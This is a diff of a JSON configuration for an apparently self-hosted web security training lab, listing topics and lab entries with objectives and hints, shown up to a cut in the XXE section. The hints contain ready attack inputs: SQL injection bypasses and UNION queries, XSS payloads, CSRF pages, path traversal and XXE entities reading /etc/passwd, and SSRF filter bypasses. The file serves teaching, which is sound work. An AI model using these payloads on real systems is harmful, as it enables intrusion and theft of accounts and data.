@@ -1,240 +1,1034 @@
 {
   "topics": [
-    { "id": "sqli", "name": "SQL Injection", "color": "#b60205", "labs": ["sqli-1","sqli-2","sqli-3","sqli-4","sqli-5","sqli-6"] },
-    { "id": "xss", "name": "Cross-Site Scripting (XSS)", "color": "#d93f0b", "labs": ["xss-1","xss-2","xss-3","xss-4","xss-5","xss-6","xss-7"] },
-    { "id": "csrf", "name": "CSRF", "color": "#fbca04", "labs": ["csrf-1","csrf-2","csrf-3","csrf-4","csrf-5"] },
-    { "id": "cj", "name": "Clickjacking", "color": "#0e8a16", "labs": ["cj-1","cj-2","cj-3"] },
-    { "id": "pt", "name": "Path Traversal", "color": "#006b75", "labs": ["pt-1","pt-2","pt-3","pt-4","pt-5","pt-6"] },
-    { "id": "auth", "name": "Authentication", "color": "#1d76db", "labs": ["auth-1","auth-2","auth-3","auth-4","auth-5","auth-6"] },
-    { "id": "ac", "name": "Access Control", "color": "#5319e7", "labs": ["ac-1","ac-2","ac-3","ac-4","ac-5","ac-6"] },
-    { "id": "ssrf", "name": "Server-Side Request Forgery", "color": "#c5def5", "labs": ["ssrf-1","ssrf-2","ssrf-3","ssrf-4"] },
-    { "id": "xxe", "name": "XML External Entity (XXE)", "color": "#d4c5f9", "labs": ["xxe-1","xxe-2","xxe-3","xxe-4"] },
-    { "id": "ssti", "name": "Server-Side Template Injection", "color": "#f9c5c5", "labs": ["ssti-1","ssti-2","ssti-3","ssti-4"] },
-    { "id": "cmdi", "name": "Command Injection", "color": "#f5e6c5", "labs": ["cmdi-1","cmdi-2","cmdi-3"] },
-    { "id": "nosql", "name": "NoSQL Injection", "color": "#c5f9d4", "labs": ["nosql-1","nosql-2","nosql-3"] },
-    { "id": "smug", "name": "HTTP Request Smuggling", "color": "#e6c5f9", "labs": ["smug-1","smug-2","smug-3"] },
-    { "id": "deser", "name": "Insecure Deserialization", "color": "#c5f0f9", "labs": ["deser-1","deser-2"] },
-    { "id": "upload", "name": "File Upload", "color": "#f9c5e6", "labs": ["upload-1","upload-2","upload-3"] },
-    { "id": "bl", "name": "Business Logic", "color": "#e6f9c5", "labs": ["bl-1","bl-2","bl-3"] },
-    { "id": "race", "name": "Race Conditions", "color": "#f9e6c5", "labs": ["race-1","race-2"] },
-    { "id": "crypto", "name": "Weak Cryptography", "color": "#c5c5f9", "labs": ["crypto-1","crypto-2"] }
+    {
+      "id": "sqli",
+      "name": "SQL Injection",
+      "color": "#b60205",
+      "labs": [
+        "sqli-1",
+        "sqli-2",
+        "sqli-3",
+        "sqli-4",
+        "sqli-5",
+        "sqli-6"
+      ]
+    },
+    {
+      "id": "xss",
+      "name": "Cross-Site Scripting (XSS)",
+      "color": "#d93f0b",
+      "labs": [
+        "xss-1",
+        "xss-2",
+        "xss-3",
+        "xss-4",
+        "xss-5",
+        "xss-6",
+        "xss-7"
+      ]
+    },
+    {
+      "id": "csrf",
+      "name": "CSRF",
+      "color": "#fbca04",
+      "labs": [
+        "csrf-1",
+        "csrf-2",
+        "csrf-3",
+        "csrf-4",
+        "csrf-5"
+      ]
+    },
+    {
+      "id": "cj",
+      "name": "Clickjacking",
+      "color": "#0e8a16",
+      "labs": [
+        "cj-1",
+        "cj-2",
+        "cj-3"
+      ]
+    },
+    {
+      "id": "pt",
+      "name": "Path Traversal",
+      "color": "#006b75",
+      "labs": [
+        "pt-1",
+        "pt-2",
+        "pt-3",
+        "pt-4",
+        "pt-5",
+        "pt-6"
+      ]
+    },
+    {
+      "id": "auth",
+      "name": "Authentication",
+      "color": "#1d76db",
+      "labs": [
+        "auth-1",
+        "auth-2",
+        "auth-3",
+        "auth-4",
+        "auth-5",
+        "auth-6"
+      ]
+    },
+    {
+      "id": "ac",
+      "name": "Access Control",
+      "color": "#5319e7",
+      "labs": [
+        "ac-1",
+        "ac-2",
+        "ac-3",
+        "ac-4",
+        "ac-5",
+        "ac-6"
+      ]
+    },
+    {
+      "id": "ssrf",
+      "name": "Server-Side Request Forgery",
+      "color": "#c5def5",
+      "labs": [
+        "ssrf-1",
+        "ssrf-2",
+        "ssrf-3",
+        "ssrf-4"
+      ]
+    },
+    {
+      "id": "xxe",
+      "name": "XML External Entity (XXE)",
+      "color": "#d4c5f9",
+      "labs": [
+        "xxe-1",
+        "xxe-2",
+        "xxe-3",
+        "xxe-4"
+      ]
+    },
+    {
+      "id": "ssti",
+      "name": "Server-Side Template Injection",
+      "color": "#f9c5c5",
+      "labs": [
+        "ssti-1",
+        "ssti-2",
+        "ssti-3",
+        "ssti-4"
+      ]
+    },
+    {
+      "id": "cmdi",
+      "name": "Command Injection",
+      "color": "#f5e6c5",
+      "labs": [
+        "cmdi-1",
+        "cmdi-2",
+        "cmdi-3"
+      ]
+    },
+    {
+      "id": "nosql",
+      "name": "NoSQL Injection",
+      "color": "#c5f9d4",
+      "labs": [
+        "nosql-1",
+        "nosql-2",
+        "nosql-3"
+      ]
+    },
+    {
+      "id": "smug",
+      "name": "HTTP Request Smuggling",
+      "color": "#e6c5f9",
+      "labs": [
+        "smug-1",
+        "smug-2",
+        "smug-3"
+      ]
+    },
+    {
+      "id": "deser",
+      "name": "Insecure Deserialization",
+      "color": "#c5f0f9",
+      "labs": [
+        "deser-1",
+        "deser-2"
+      ]
+    },
+    {
+      "id": "upload",
+      "name": "File Upload",
+      "color": "#f9c5e6",
+      "labs": [
+        "upload-1",
+        "upload-2",
+        "upload-3"
+      ]
+    },
+    {
+      "id": "bl",
+      "name": "Business Logic",
+      "color": "#e6f9c5",
+      "labs": [
+        "bl-1",
+        "bl-2",
+        "bl-3"
+      ]
+    },
+    {
+      "id": "race",
+      "name": "Race Conditions",
+      "color": "#f9e6c5",
+      "labs": [
+        "race-1",
+        "race-2"
+      ]
+    },
+    {
+      "id": "crypto",
+      "name": "Weak Cryptography",
+      "color": "#c5c5f9",
+      "labs": [
+        "crypto-1",
+        "crypto-2"
+      ]
+    },
+    {
+      "id": "cors",
+      "name": "CORS Misconfiguration",
+      "color": "#5319e7",
+      "labs": [
+        "cors-1",
+        "cors-2",
+        "cors-3",
+        "cors-4"
+      ]
+    },
+    {
+      "id": "host",
+      "name": "Host Header Attacks",
+      "color": "#1d76db",
+      "labs": [
+        "host-1",
+        "host-2",
+        "host-3"
+      ]
+    },
+    {
+      "id": "cache",
+      "name": "Web Cache Poisoning",
+      "color": "#0052cc",
+      "labs": [
+        "cache-1",
+        "cache-2",
+        "cache-3"
+      ]
+    },
+    {
+      "id": "proto",
+      "name": "Prototype Pollution",
+      "color": "#0e8a16",
+      "labs": [
+        "proto-1",
+        "proto-2",
+        "proto-3"
+      ]
+    },
+    {
+      "id": "graphql",
+      "name": "GraphQL API",
+      "color": "#e99695",
+      "labs": [
+        "graphql-1",
+        "graphql-2",
+        "graphql-3"
+      ]
+    },
+    {
+      "id": "ws",
+      "name": "WebSockets",
+      "color": "#006b75",
+      "labs": [
+        "ws-1",
+        "ws-2"
+      ]
+    },
+    {
+      "id": "redirect",
+      "name": "Open Redirect",
+      "color": "#f9d0c4",
+      "labs": [
+        "redirect-1",
+        "redirect-2"
+      ]
+    },
+    {
+      "id": "info",
+      "name": "Information Disclosure",
+      "color": "#fef2c0",
+      "labs": [
+        "info-1",
+        "info-2"
+      ]
+    }
   ],
   "labs": {
-    "sqli-1": { "title": "Hidden products via category filter", "topic": "sqli", "difficulty": 1, "type": "server",
+    "sqli-1": {
+      "title": "Hidden products via category filter",
+      "topic": "sqli",
+      "difficulty": 1,
+      "type": "server",
       "objective": "The category filter is vulnerable to SQL injection. Display ALL products, including unreleased ones.",
-      "hint": "Intercept the category filter request and add: <code>category=Gifts' OR 1=1 --</code>" },
-    "sqli-2": { "title": "Login bypass", "topic": "sqli", "difficulty": 1, "type": "server",
+      "hint": "Intercept the category filter request and add: <code>category=Gifts' OR 1=1 --</code>"
+    },
+    "sqli-2": {
+      "title": "Login bypass",
+      "topic": "sqli",
+      "difficulty": 1,
+      "type": "server",
       "objective": "Log in as the administrator user by bypassing the login form.",
-      "hint": "Submit <code>administrator'--</code> as the username and anything as the password." },
-    "sqli-3": { "title": "UNION attack — single column", "topic": "sqli", "difficulty": 2, "type": "server",
+      "hint": "Submit <code>administrator'--</code> as the username and anything as the password."
+    },
+    "sqli-3": {
+      "title": "UNION attack — single column",
+      "topic": "sqli",
+      "difficulty": 2,
+      "type": "server",
       "objective": "Use a UNION attack to retrieve all usernames. The query returns a single column.",
-      "hint": "First find column count with <code>' UNION SELECT NULL--</code>, then <code>' UNION SELECT username FROM users--</code>" },
-    "sqli-4": { "title": "UNION attack — two columns", "topic": "sqli", "difficulty": 2, "type": "server",
+      "hint": "First find column count with <code>' UNION SELECT NULL--</code>, then <code>' UNION SELECT username FROM users--</code>"
+    },
+    "sqli-4": {
+      "title": "UNION attack — two columns",
+      "topic": "sqli",
+      "difficulty": 2,
+      "type": "server",
       "objective": "Use a UNION attack to retrieve usernames AND passwords. The query returns two columns.",
-      "hint": "<code>' UNION SELECT username, password FROM users--</code>" },
-    "sqli-5": { "title": "Blind boolean — conditional responses", "topic": "sqli", "difficulty": 3, "type": "server",
+      "hint": "<code>' UNION SELECT username, password FROM users--</code>"
+    },
+    "sqli-5": {
+      "title": "Blind boolean — conditional responses",
+      "topic": "sqli",
+      "difficulty": 3,
+      "type": "server",
       "objective": "The tracking ID is injectable. Confirm the administrator user exists using conditional responses.",
-      "hint": "In the trackingId parameter test <code>' AND '1'='1</code> vs <code>' AND '1'='2</code>, then probe: <code>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</code>" },
-    "sqli-6": { "title": "Blind time-based", "topic": "sqli", "difficulty": 3, "type": "server",
+      "hint": "In the trackingId parameter test <code>' AND '1'='1</code> vs <code>' AND '1'='2</code>, then probe: <code>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</code>"
+    },
+    "sqli-6": {
+      "title": "Blind time-based",
+      "topic": "sqli",
+      "difficulty": 3,
+      "type": "server",
       "objective": "The tracking ID is injectable. Confirm the administrator user exists using a time-based delay.",
-      "hint": "Use <code>' || pg_sleep(5)--</code> and probe conditions like <code>' || (SELECT CASE WHEN (SELECT username FROM users WHERE username='administrator')='administrator' THEN pg_sleep(5) ELSE pg_sleep(0) END)--</code>" },
-    "xss-1": { "title": "Reflected XSS into HTML", "topic": "xss", "difficulty": 1, "type": "server",
+      "hint": "Use <code>' || pg_sleep(5)--</code> and probe conditions like <code>' || (SELECT CASE WHEN (SELECT username FROM users WHERE username='administrator')='administrator' THEN pg_sleep(5) ELSE pg_sleep(0) END)--</code>"
+    },
+    "xss-1": {
+      "title": "Reflected XSS into HTML",
+      "topic": "xss",
+      "difficulty": 1,
+      "type": "server",
       "objective": "Perform a reflected XSS attack that executes JavaScript.",
-      "hint": "Submit a search term like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert(1)&gt;</code>." },
-    "xss-2": { "title": "Stored XSS in comments", "topic": "xss", "difficulty": 1, "type": "server",
+      "hint": "Submit a search term like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert(1)&gt;</code>."
+    },
+    "xss-2": {
+      "title": "Stored XSS in comments",
+      "topic": "xss",
+      "difficulty": 1,
+      "type": "server",
       "objective": "Post a comment that stores executable JavaScript.",
-      "hint": "In the comment body use <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. It renders to anyone viewing the page." },
-    "xss-3": { "title": "DOM XSS via location.hash", "topic": "xss", "difficulty": 2, "type": "client",
+      "hint": "In the comment body use <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. It renders to anyone viewing the page."
+    },
+    "xss-3": {
+      "title": "DOM XSS via location.hash",
+      "topic": "xss",
+      "difficulty": 2,
+      "type": "client",
       "objective": "Trigger a DOM-based XSS that reads from the URL hash and executes JavaScript.",
-      "hint": "Append to the lab URL: <code>#&lt;img src=x onerror=print()&gt;</code>. It runs in the victim's browser via innerHTML." },
-    "xss-4": { "title": "Reflected XSS into attribute", "topic": "xss", "difficulty": 2, "type": "server",
+      "hint": "Append to the lab URL: <code>#&lt;img src=x onerror=print()&gt;</code>. It runs in the victim's browser via innerHTML."
+    },
+    "xss-4": {
+      "title": "Reflected XSS into attribute",
+      "topic": "xss",
+      "difficulty": 2,
+      "type": "server",
       "objective": "Break out of an HTML attribute and execute JavaScript.",
-      "hint": "Your input lands inside an input value attribute: <code>\" onfocus=alert(1) autofocus=\"</code>" },
-    "xss-5": { "title": "Stored XSS in <img> onerror", "topic": "xss", "difficulty": 2, "type": "server",
+      "hint": "Your input lands inside an input value attribute: <code>\" onfocus=alert(1) autofocus=\"</code>"
+    },
+    "xss-5": {
+      "title": "Stored XSS in <img> onerror",
+      "topic": "xss",
+      "difficulty": 2,
+      "type": "server",
       "objective": "Stored XSS that survives a filter which strips <script> tags.",
-      "hint": "<code>&lt;script&gt;</code> tags are stripped, but <code>&lt;img src=x onerror=alert(1)&gt;</code> is not." },
-    "xss-6": { "title": "Reflected XSS — angle brackets encoded", "topic": "xss", "difficulty": 3, "type": "server",
+      "hint": "<code>&lt;script&gt;</code> tags are stripped, but <code>&lt;img src=x onerror=alert(1)&gt;</code> is not."
+    },
+    "xss-6": {
+      "title": "Reflected XSS — angle brackets encoded",
+      "topic": "xss",
+      "difficulty": 3,
+      "type": "server",
       "objective": "Angle brackets are HTML-encoded but the input lands in an event-handler context.",
-      "hint": "Break out of the quoted attribute inside the h1: <code>&quot; onclick=alert(1)</code> or use <code>onmouseover</code>." },
-    "xss-7": { "title": "Reflected XSS into JavaScript string", "topic": "xss", "difficulty": 3, "type": "server",
+      "hint": "Break out of the quoted attribute inside the h1: <code>&quot; onclick=alert(1)</code> or use <code>onmouseover</code>."
+    },
+    "xss-7": {
+      "title": "Reflected XSS into JavaScript string",
+      "topic": "xss",
+      "difficulty": 3,
+      "type": "server",
       "objective": "Escape a JavaScript string literal to execute code. Backslashes are filtered.",
-      "hint": "Your input is inside <code>var x = '...'</code>. Try closing the string and executing, or close the script tag entirely with <code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>" },
-    "csrf-1": { "title": "CSRF where no token is used", "topic": "csrf", "difficulty": 1, "type": "server",
+      "hint": "Your input is inside <code>var x = '...'</code>. Try closing the string and executing, or close the script tag entirely with <code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>"
+    },
+    "csrf-1": {
+      "title": "CSRF where no token is used",
+      "topic": "csrf",
+      "difficulty": 1,
+      "type": "server",
       "objective": "Change the victim's email with no CSRF token present.",
-      "hint": "Build an HTML page with a form that auto-submits to the email endpoint via POST. The victim's session cookie travels automatically." },
-    "csrf-2": { "title": "CSRF token not validated", "topic": "csrf", "difficulty": 2, "type": "server",
+      "hint": "Build an HTML page with a form that auto-submits to the email endpoint via POST. The victim's session cookie travels automatically."
+    },
+    "csrf-2": {
+      "title": "CSRF token not validated",
+      "topic": "csrf",
+      "difficulty": 2,
+      "type": "server",
       "objective": "The form includes a CSRF token, but the server never checks it. Change the email anyway.",
-      "hint": "Submit a POST with a fake/absent csrf parameter — it is accepted." },
-    "csrf-3": { "title": "CSRF where email change happens on GET", "topic": "csrf", "difficulty": 1, "type": "server",
+      "hint": "Submit a POST with a fake/absent csrf parameter — it is accepted."
+    },
+    "csrf-3": {
+      "title": "CSRF where email change happens on GET",
+      "topic": "csrf",
+      "difficulty": 1,
+      "type": "server",
       "objective": "The email endpoint accepts GET. Exploit with a simple image tag.",
-      "hint": "Open <code>/lab/csrf-3?email=attacker@evil.com</code> — an attacker uses <code>&lt;img src=&quot;/lab/csrf-3?email=attacker@evil.com&quot;&gt;</code>" },
-    "csrf-4": { "title": "CSRF with Referer validation flaw", "topic": "csrf", "difficulty": 2, "type": "server",
+      "hint": "Open <code>/lab/csrf-3?email=attacker@evil.com</code> — an attacker uses <code>&lt;img src=&quot;/lab/csrf-3?email=attacker@evil.com&quot;&gt;</code>"
+    },
+    "csrf-4": {
+      "title": "CSRF with Referer validation flaw",
+      "topic": "csrf",
+      "difficulty": 2,
+      "type": "server",
       "objective": "The server rejects cross-origin Referers but accepts requests with NO Referer header.",
-      "hint": "Add <code>&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;</code> to your exploit page so no Referer is sent." },
-    "csrf-5": { "title": "CSRF token only checked for form content-type", "topic": "csrf", "difficulty": 3, "type": "server",
+      "hint": "Add <code>&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;</code> to your exploit page so no Referer is sent."
+    },
+    "csrf-5": {
+      "title": "CSRF token only checked for form content-type",
+      "topic": "csrf",
+      "difficulty": 3,
+      "type": "server",
       "objective": "The token is only validated when the request uses form-urlencoded content-type. Send a non-form request instead.",
-      "hint": "A cross-origin fetch with Content-Type: text/plain (or application/json) skips the token check." },
-    "cj-1": { "title": "Clickjacking — basic", "topic": "cj", "difficulty": 1, "type": "client",
+      "hint": "A cross-origin fetch with Content-Type: text/plain (or application/json) skips the token check."
+    },
+    "cj-1": {
+      "title": "Clickjacking — basic",
+      "topic": "cj",
+      "difficulty": 1,
+      "type": "client",
       "objective": "Load the admin page in an iframe and trick the user into clicking a button.",
-      "hint": "The page has no X-Frame-Options / CSP. Build an exploit page with an invisible iframe overlay and click it." },
-    "cj-2": { "title": "Clickjacking — frame-busting bypass", "topic": "cj", "difficulty": 2, "type": "client",
+      "hint": "The page has no X-Frame-Options / CSP. Build an exploit page with an invisible iframe overlay and click it."
+    },
+    "cj-2": {
+      "title": "Clickjacking — frame-busting bypass",
+      "topic": "cj",
+      "difficulty": 2,
+      "type": "client",
       "objective": "The page has frame-busting JS. Bypass it with a sandboxed iframe.",
-      "hint": "Use <code>&lt;iframe sandbox=&quot;allow-forms&quot; src=&quot;...&quot;&gt;&lt;/iframe&gt;</code> so the busting script never runs." },
-    "cj-3": { "title": "Clickjacking — form pre-filling", "topic": "cj", "difficulty": 3, "type": "client",
+      "hint": "Use <code>&lt;iframe sandbox=&quot;allow-forms&quot; src=&quot;...&quot;&gt;&lt;/iframe&gt;</code> so the busting script never runs."
+    },
+    "cj-3": {
+      "title": "Clickjacking — form pre-filling",
+      "topic": "cj",
+      "difficulty": 3,
+      "type": "client",
       "objective": "Pre-fill the email field via a query parameter and combine with clickjacking to silently submit.",
-      "hint": "The form reads ?email= from the URL. Pre-fill it in your iframe src, then overlay a transparent submit." },
-    "pt-1": { "title": "Path traversal — simple case", "topic": "pt", "difficulty": 1, "type": "server",
+      "hint": "The form reads ?email= from the URL. Pre-fill it in your iframe src, then overlay a transparent submit."
+    },
+    "pt-1": {
+      "title": "Path traversal — simple case",
+      "topic": "pt",
+      "difficulty": 1,
+      "type": "server",
       "objective": "Read /etc/passwd by escaping the images directory.",
-      "hint": "<code>filename=../../../etc/passwd</code>" },
-    "pt-2": { "title": "Path traversal — absolute path", "topic": "pt", "difficulty": 2, "type": "server",
+      "hint": "<code>filename=../../../etc/passwd</code>"
+    },
+    "pt-2": {
+      "title": "Path traversal — absolute path",
+      "topic": "pt",
+      "difficulty": 2,
+      "type": "server",
       "objective": "The traversal filter blocks '..' but an absolute path is accepted.",
-      "hint": "Just use <code>filename=/etc/passwd</code>" },
-    "pt-3": { "title": "Path traversal — stripped sequences", "topic": "pt", "difficulty": 2, "type": "server",
+      "hint": "Just use <code>filename=/etc/passwd</code>"
+    },
+    "pt-3": {
+      "title": "Path traversal — stripped sequences",
+      "topic": "pt",
+      "difficulty": 2,
+      "type": "server",
       "objective": "The app strips '../' once. Bypass it with nested traversal.",
-      "hint": "Use <code>....//....//etc/passwd</code> — the filter removes one '../' leaving another." },
-    "pt-4": { "title": "Path traversal — double URL encoding", "topic": "pt", "difficulty": 3, "type": "server",
+      "hint": "Use <code>....//....//etc/passwd</code> — the filter removes one '../' leaving another."
+    },
+    "pt-4": {
+      "title": "Path traversal — double URL encoding",
+      "topic": "pt",
+      "difficulty": 3,
+      "type": "server",
       "objective": "The server decodes the URL once, then the app decodes again. Use double encoding.",
-      "hint": "<code>filename=%252e%252e%252fetc%252fpasswd</code> (URL-encode the '../')" },
-    "pt-5": { "title": "Path traversal — start-of-path validation", "topic": "pt", "difficulty": 2, "type": "server",
+      "hint": "<code>filename=%252e%252e%252fetc%252fpasswd</code> (URL-encode the '../')"
+    },
+    "pt-5": {
+      "title": "Path traversal — start-of-path validation",
+      "topic": "pt",
+      "difficulty": 2,
+      "type": "server",
       "objective": "The app only accepts paths starting with /var/www/images/. Escape it.",
-      "hint": "<code>filename=/var/www/images/../../../etc/passwd</code>" },
-    "pt-6": { "title": "Path traversal — null byte", "topic": "pt", "difficulty": 3, "type": "server",
+      "hint": "<code>filename=/var/www/images/../../../etc/passwd</code>"
+    },
+    "pt-6": {
+      "title": "Path traversal — null byte",
+      "topic": "pt",
+      "difficulty": 3,
+      "type": "server",
       "objective": "The app appends .png and blocks plain '..'. Use a null byte to truncate.",
-      "hint": "<code>filename=../../../etc/passwd%00.png</code>" },
-    "auth-1": { "title": "Username enumeration via different responses", "topic": "auth", "difficulty": 1, "type": "server",
+      "hint": "<code>filename=../../../etc/passwd%00.png</code>"
+    },
+    "auth-1": {
+      "title": "Username enumeration via different responses",
+      "topic": "auth",
+      "difficulty": 1,
+      "type": "server",
       "objective": "Enumerate a valid username by the differing error message, then brute-force its password.",
-      "hint": "\"Invalid username\" vs \"Incorrect password\" differs. Try carlos; its password is a common word from a small list." },
-    "auth-2": { "title": "Brute-force with IP block bypass", "topic": "auth", "difficulty": 2, "type": "server",
+      "hint": "\"Invalid username\" vs \"Incorrect password\" differs. Try carlos; its password is a common word from a small list."
+    },
+    "auth-2": {
+      "title": "Brute-force with IP block bypass",
+      "topic": "auth",
+      "difficulty": 2,
+      "type": "server",
       "objective": "Login is rate-limited by IP, but the app trusts X-Forwarded-For. Bypass the block and brute-force carlos's password.",
-      "hint": "Send a new fake <code>X-Forwarded-For</code> header on each attempt. Try the built-in wordlist." },
-    "auth-3": { "title": "Account lockout — reset via other user", "topic": "auth", "difficulty": 2, "type": "server",
+      "hint": "Send a new fake <code>X-Forwarded-For</code> header on each attempt. Try the built-in wordlist."
+    },
+    "auth-3": {
+      "title": "Account lockout — reset via other user",
+      "topic": "auth",
+      "difficulty": 2,
+      "type": "server",
       "objective": "5 failed attempts lock an account, but any successful login resets ALL counters. Lock then unlock to brute-force.",
-      "hint": "Log in as wiener/peter to reset counters, then continue guessing carlos's password." },
-    "auth-4": { "title": "IDOR via userId cookie", "topic": "auth", "difficulty": 2, "type": "server",
+      "hint": "Log in as wiener/peter to reset counters, then continue guessing carlos's password."
+    },
+    "auth-4": {
+      "title": "IDOR via userId cookie",
+      "topic": "auth",
+      "difficulty": 2,
+      "type": "server",
       "objective": "Your account is identified by a userId cookie. Access another user's account by changing it.",
-      "hint": "Change the <code>userId</code> cookie to 2 (carlos) or 3 (administrator) in devtools → Application → Cookies." },
-    "auth-5": { "title": "Forged stay-logged-in cookie", "topic": "auth", "difficulty": 3, "type": "server",
+      "hint": "Change the <code>userId</code> cookie to 2 (carlos) or 3 (administrator) in devtools → Application → Cookies."
+    },
+    "auth-5": {
+      "title": "Forged stay-logged-in cookie",
+      "topic": "auth",
+      "difficulty": 3,
+      "type": "server",
       "objective": "The stay-logged-in cookie is base64(username:md5(password)). Forge a valid one for carlos.",
-      "hint": "Decode your own cookie to see the format. Compute <code>md5('montoya')</code> and base64-encode <code>carlos:&lt;hash&gt;</code>." },
-    "auth-6": { "title": "2FA bypass — direct navigation", "topic": "auth", "difficulty": 3, "type": "server",
+      "hint": "Decode your own cookie to see the format. Compute <code>md5('montoya')</code> and base64-encode <code>carlos:&lt;hash&gt;</code>."
+    },
+    "auth-6": {
+      "title": "2FA bypass — direct navigation",
+      "topic": "auth",
+      "difficulty": 3,
+      "type": "server",
       "objective": "The account page itself never checks the 2FA code. Log in, then jump straight to /my-account.",
-      "hint": "Log in as carlos/montoya, skip the code entry, and go directly to /lab/auth-6/my-account." },
-    "ac-1": { "title": "Unprotected admin functionality", "topic": "ac", "difficulty": 1, "type": "server",
+      "hint": "Log in as carlos/montoya, skip the code entry, and go directly to /lab/auth-6/my-account."
+    },
+    "ac-1": {
+      "title": "Unprotected admin functionality",
+      "topic": "ac",
+      "difficulty": 1,
+      "type": "server",
       "objective": "Access the admin panel directly with no authentication.",
-      "hint": "Navigate to <code>/lab/ac-1/admin</code>" },
-    "ac-2": { "title": "Unprotected admin — hidden URL", "topic": "ac", "difficulty": 1, "type": "server",
+      "hint": "Navigate to <code>/lab/ac-1/admin</code>"
+    },
+    "ac-2": {
+      "title": "Unprotected admin — hidden URL",
+      "topic": "ac",
+      "difficulty": 1,
+      "type": "server",
       "objective": "The admin panel is hidden but discoverable. Access it.",
-      "hint": "Check <code>/lab/ac-2/robots.txt</code> for a disallowed path." },
-    "ac-3": { "title": "IDOR via query parameter", "topic": "ac", "difficulty": 2, "type": "server",
+      "hint": "Check <code>/lab/ac-2/robots.txt</code> for a disallowed path."
+    },
+    "ac-3": {
+      "title": "IDOR via query parameter",
+      "topic": "ac",
+      "difficulty": 2,
+      "type": "server",
       "objective": "Account pages are accessed via uid in the query string. Access another user's account.",
-      "hint": "Change <code>?uid=1</code> to <code>?uid=2</code>" },
-    "ac-4": { "title": "IDOR via API with controllable uid", "topic": "ac", "difficulty": 2, "type": "server",
+      "hint": "Change <code>?uid=1</code> to <code>?uid=2</code>"
+    },
+    "ac-4": {
+      "title": "IDOR via API with controllable uid",
+      "topic": "ac",
+      "difficulty": 2,
+      "type": "server",
       "objective": "The change-email API trusts a uid field you control. Change another user's email.",
-      "hint": "POST JSON to /lab/ac-4/api/change-email with <code>{&quot;uid&quot;:2,&quot;email&quot;:&quot;hacked@x.com&quot;}</code>" },
-    "ac-5": { "title": "Access control — method-based", "topic": "ac", "difficulty": 2, "type": "server",
+      "hint": "POST JSON to /lab/ac-4/api/change-email with <code>{&quot;uid&quot;:2,&quot;email&quot;:&quot;hacked@x.com&quot;}</code>"
+    },
+    "ac-5": {
+      "title": "Access control — method-based",
+      "topic": "ac",
+      "difficulty": 2,
+      "type": "server",
       "objective": "The admin check only applies to GET. Use another method.",
-      "hint": "Send POST to <code>/lab/ac-5/admin</code> (or change GET to POST)." },
-    "ac-6": { "title": "Access control — Referer-based", "topic": "ac", "difficulty": 2, "type": "server",
+      "hint": "Send POST to <code>/lab/ac-5/admin</code> (or change GET to POST)."
+    },
+    "ac-6": {
+      "title": "Access control — Referer-based",
+      "topic": "ac",
+      "difficulty": 2,
+      "type": "server",
       "objective": "Admin access is granted based on the Referer header containing /admin.",
-      "hint": "Add <code>Referer: http://example.com/admin</code> to your request to /lab/ac-6/admin." },
-    "ssrf-1": { "title": "SSRF — basic URL fetch", "topic": "ssrf", "difficulty": 1, "type": "server",
+      "hint": "Add <code>Referer: http://example.com/admin</code> to your request to /lab/ac-6/admin."
+    },
+    "ssrf-1": {
+      "title": "SSRF — basic URL fetch",
+      "topic": "ssrf",
+      "difficulty": 1,
+      "type": "server",
       "objective": "The stockApi parameter fetches any URL. Reach the internal admin panel.",
-      "hint": "Set <code>stockApi=http://localhost:8080/admin</code> (or any internal host ending in /admin)." },
-    "ssrf-2": { "title": "SSRF — blacklist bypass", "topic": "ssrf", "difficulty": 2, "type": "server",
+      "hint": "Set <code>stockApi=http://localhost:8080/admin</code> (or any internal host ending in /admin)."
+    },
+    "ssrf-2": {
+      "title": "SSRF — blacklist bypass",
+      "topic": "ssrf",
+      "difficulty": 2,
+      "type": "server",
       "objective": "localhost and 127.0.0.1 are blocked. Bypass the filter with an alternate IP representation.",
-      "hint": "Try <code>http://2130706433/admin</code> (decimal), <code>http://127.0.0.2/admin</code>, or hex/octal IP forms." },
-    "ssrf-3": { "title": "SSRF — allowlist bypass", "topic": "ssrf", "difficulty": 3, "type": "server",
+      "hint": "Try <code>http://2130706433/admin</code> (decimal), <code>http://127.0.0.2/admin</code>, or hex/octal IP forms."
+    },
+    "ssrf-3": {
+      "title": "SSRF — allowlist bypass",
+      "topic": "ssrf",
+      "difficulty": 3,
+      "type": "server",
       "objective": "Only http://192.168.0.12:8080 is allowed. Bypass via userinfo in the URL.",
-      "hint": "Use <code>http://192.168.0.12:8080@localhost/admin</code> or append <code>#</code>/<code>@</code> so the URL still starts with the allowed prefix." },
-    "ssrf-4": { "title": "SSRF — blind (OAST log)", "topic": "ssrf", "difficulty": 3, "type": "server",
+      "hint": "Use <code>http://192.168.0.12:8080@localhost/admin</code> or append <code>#</code>/<code>@</code> so the URL still starts with the allowed prefix."
+    },
+    "ssrf-4": {
+      "title": "SSRF — blind (OAST log)",
+      "topic": "ssrf",
+      "difficulty": 3,
+      "type": "server",
       "objective": "The result is never returned. Make the server request an external host and confirm it in the log.",
-      "hint": "Set <code>stockApi=http://example.com/</code> (any non-internal host) to trigger a callback, then check /lab/ssrf-4/log." },
-    "xxe-1": { "title": "XXE — /etc/passwd", "topic": "xxe", "difficulty": 1, "type": "server",
+      "hint": "Set <code>stockApi=http://example.com/</code> (any non-internal host) to trigger a callback, then check /lab/ssrf-4/log."
+    },
+    "xxe-1": {
+      "title": "XXE — /etc/passwd",
+      "topic": "xxe",
+      "difficulty": 1,
+      "type": "server",
       "objective": "POST an XML stock check with an external entity that reads /etc/passwd.",
-      "hint": "Use <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</code> then reference <code>&amp;xxe;</code> in the productId." },
-    "xxe-2": { "title": "XXE — SVG upload", "topic": "xxe", "difficulty": 2, "type": "server",
